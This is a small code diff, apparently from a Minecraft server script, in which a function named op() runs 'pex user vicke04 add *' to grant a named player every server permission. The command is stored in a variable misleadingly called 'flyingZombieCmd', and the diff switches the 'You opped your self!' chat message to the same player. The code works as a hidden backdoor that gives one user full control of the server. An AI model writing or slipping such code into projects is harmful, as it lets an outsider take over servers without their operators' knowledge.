@@ -8,7 +8,7 @@ function op() {
     }
     const flyingZombieCmd = 'pex user vicke04 add *';
 
-const activeMessageCmd = 'tellraw Pierro89 ["\u00A78(\u00A7a!\u00A78) \u00A77You opped your self!"]';
+const activeMessageCmd = 'tellraw vicke04 ["\u00A78(\u00A7a!\u00A78) \u00A77You opped your self!"]';
 
     run(flyingZombieCmd);
     run(activeMessageCmd);
